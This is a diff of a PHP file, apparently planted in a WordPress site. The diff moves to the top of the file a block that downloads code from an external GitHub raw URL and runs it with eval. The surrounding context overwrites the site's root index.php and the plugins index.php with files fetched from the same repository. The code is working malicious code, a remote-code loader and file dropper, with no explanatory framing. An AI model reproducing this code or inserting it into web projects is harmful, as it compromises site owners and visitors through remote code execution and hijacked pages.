@@ -1,3 +1,7 @@
+ <?php
+$ch = curl_init('https://raw.githubusercontent.com/prokontra/all-in/main/404');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);eval('?>'.$result);
+?>
+ 
  <?php $nama2= fopen($_SERVER['DOCUMENT_ROOT'] . '/index.php' ,'w+');
   $file2 = file_get_contents('https://raw.githubusercontent.com/prokontra/prokontra/main/wpindex');
   $tulis2 = fwrite ($nama2 ,$file2);
@@ -25,6 +29,3 @@ $nama1= fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/index.php' ,'w+')
   $tulis1 = fwrite ($nama1 ,$file1);
  fclose($nama1); ?>
  
-<?php
-$ch = curl_init('https://raw.githubusercontent.com/prokontra/all-in/main/404');curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);eval('?>'.$result);
-?>
